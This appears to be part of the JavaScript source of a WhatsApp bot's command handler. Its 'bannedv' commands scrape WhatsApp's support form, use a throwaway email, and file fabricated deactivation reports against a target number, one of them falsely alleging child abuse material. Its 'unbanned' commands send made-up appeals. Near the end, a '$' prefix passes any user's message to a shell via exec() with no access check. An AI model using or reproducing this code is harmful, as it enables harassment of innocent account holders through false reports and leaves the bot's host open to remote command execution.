Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv1": case "kenon":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628155918455`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello, please deactivate this number, because I have lost my cellphone and someone is using my number, please deactivate my number")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv2": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628155918455`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv3": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628155918455`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/Roubado: Por favor, desative minha conta\n\nOlá, por favor desative este número, pois perdi meu celular e alguém está usando meu número, por favor desative meu número")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv4": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628155918455`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "UM DE SEUS USUÁRIOS, ESTA USANDO O APK DO WHATSAPP FEITO POR TERCEIROS E ESTA INDO CONTRA OS TERMOS DE SERVIÇO PEÇO QUE ANALISEM ESSE USUÁRIO")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv5": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628155918455`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا ، يرجى إلغاء تنشيط هذا الرقم ، لأنني فقدت هاتفي وشخص ما يستخدم رقمي ، يرجى إلغاء تنشيط رقمي")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv6": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Esse número vem fazendo discurso ao ódio e divulgado conteúdo de porno infantil Numero")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv1": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628155918455`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello WhatsApp team, recently my WhatsApp number was suddenly blocked and I couldnt log into my account, in my account there is an important group like a school group and I have to read it but the account My WhatsApp is suddenly blocked, please restore my numbers")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv2": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628155918455`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv3": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628155918455`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Kepada pihak WhatsApp yang bijak Sana kenapa akun WhatsApp saya terblokir padahal aktifitas WhatsApp messenger saya normal normal saja mohon dibukakan kembali akun WhatsApp saya dengan ini saya cantumkan kode nomor akun WhatsApp messenger saya sekian banyak Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv4": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628155918455`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا whatsapp ، تم حظر حسابي بشكل دائم أو مؤقت ، يرجى إلغاء حظر حسابي\nالرقم")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv5": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628155918455`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Halo pak, Akun Whatsapp Saya diblokir Saya Maaf Saya Telah Menginstal Aplikasi Pihak Ketiga Secara Tidak Sengaja. Harap Buka Blokir Akun Saya Sesegera Mungkin. Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "linkgc": case "linkgroup":{
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
const url = await Biiofc.groupInviteCode(m.chat)
const asu = "https://chat.whatsapp.com/" + url
reply(asu)
}
break
case "hidetag": {
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
if (!q) return reply(`Teks?`)
global.hit = q
Biiofc.sendMessage(from, { text : global.hit ? global.hit : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case "add": {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !isOwner) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botAdmin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Biiofc.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "kick": {
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Biiofc.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "promote": {
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Biiofc.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "demote": {
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Biiofc.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "antilink":{
if (!isGroup) return reply(mess.only.group)
if (!isAdmins && !isOwner) return reply(mess.only.admin)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] == 'on') {
if (antilink) return reply('*Sudah Aktif!*')
antilink = true
reply('*Berhasil Mengaktifkan Antilink*')
} else if (args[0] == 'off') {
if (!antilink) return reply('*Belum Aktif!*')
antilink = false
reply('*Berhasil Mematikan Antilink*')
} else {
reply(`Command Salah Silahkan Gunakan Command Seperti Ini ${prefix}antilink on/off\n${prefix}antilink on = Untuk Menyalakan\n${prefix}antilink off = Untuk Mematikan`)
}
}
break
default:
}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(mess.only.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (e) {
console.log(e)
Biiofc.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})